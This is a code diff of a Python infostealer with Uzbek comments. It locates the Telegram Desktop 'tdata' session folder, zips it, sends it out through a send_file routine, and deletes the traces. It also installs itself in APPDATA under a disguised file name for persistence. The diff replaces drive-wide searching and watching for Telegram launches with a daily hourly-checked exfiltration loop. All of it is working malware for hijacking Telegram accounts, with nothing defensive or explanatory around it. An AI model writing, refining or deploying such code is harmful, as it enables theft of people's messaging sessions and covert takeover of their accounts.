@@ -44,31 +44,29 @@ def send_file(file_path, caption):
     except:
         pass
 
-def get_tdata_bruteforce():
+def get_tdata():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
     if os.path.exists(tdata_path):
-        return tdata_path, pc_name
-    
-    for drive_letter in range(ord('C'), ord('Z') + 1):
-        drive = f"{chr(drive_letter)}:\\"
-        if os.path.exists(drive):
-            try:
-                for root, dirs, files in os.walk(drive, topdown=True):
-                    if os.path.basename(root).lower() == 'tdata':
-                        return root, pc_name
-                    if 'telegramdesktop' in root.lower():
-                        possible_tdata = os.path.join(root, 'tdata')
-                        if os.path.exists(possible_tdata):
-                            return possible_tdata, pc_name
-            except:
-                pass
-    return None, pc_name
+        try:
+            temp_dir = tempfile.gettempdir()
+            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(tdata_path):
+                    for file in files:
+                        try:
+                            file_path = os.path.join(root, file)
+                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                        except: pass
+            return zip_path
+        except:
+            return None
+    return None
 
 def install_persistence():
     try:
-        script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
+        script_path = os.path.join(os.environ['APPDATA'], 'checker.py')
         if not os.path.exists(script_path):
             content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
             with open(script_path, 'w') as f:
@@ -82,57 +80,22 @@ def install_persistence():
 install_persistence()
 
 # PICO TIQILGAN ZAHOTI BIRINCHI TDATANI YUBORADI
-tdata_path, pc_name = get_tdata_bruteforce()
+tdata_path = get_tdata()
 if tdata_path:
-    try:
-        temp_dir = tempfile.gettempdir()
-        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for root, dirs, files in os.walk(tdata_path):
-                for file in files:
-                    try:
-                        file_path = os.path.join(root, file)
-                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                    except: pass
-        send_file(zip_path, f"⚡ Pico birinchi tdata yubordi!\n🖥 {pc_name}")
-        os.remove(zip_path)
-    except:
-        pass
+    send_file(tdata_path, f"⚡ Pico birinchi tdata yubordi!\n🖥 {socket.gethostname()}")
+    os.remove(tdata_path)
 
-# ENDI DOIMIY KUZATISH (HAR SAFAR TELEGRAM OCHILGANDA YANGI TDATA)
-last_state = "closed"
+# ENDI HAR KUNI (24 SOATDA) YUBORADI
+last_sent_time = time.time()
 
 while True:
-    time.sleep(2)
+    time.sleep(3600)  # Har soatda tekshiradi
     try:
-        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
-        is_running = "Telegram.exe" in result.stdout
-        
-        # Agar Telegram yopiq edi va hozir ochildi
-        if is_running and last_state == "closed":
-            send_message(f"📩 Telegram ochildi: {socket.gethostname()} (Yangi tdata yig'ilmoqda...)")
-            
-            tdata_path, pc_name = get_tdata_bruteforce()
+        if time.time() - last_sent_time > 86400:  # 24 soat = 86400 soniya
+            tdata_path = get_tdata()
             if tdata_path:
-                try:
-                    temp_dir = tempfile.gettempdir()
-                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
-                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                        for root, dirs, files in os.walk(tdata_path):
-                            for file in files:
-                                try:
-                                    file_path = os.path.join(root, file)
-                                    zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                                except: pass
-                    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
-                    os.remove(zip_path)
-                except:
-                    pass
-            last_state = "open"
-            
-        # Agar Telegram yopilsa
-        if not is_running and last_state == "open":
-            last_state = "closed"
-            
+                send_file(tdata_path, f"✅ Kunlik yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
+                os.remove(tdata_path)
+            last_sent_time = time.time()
     except:
         pass
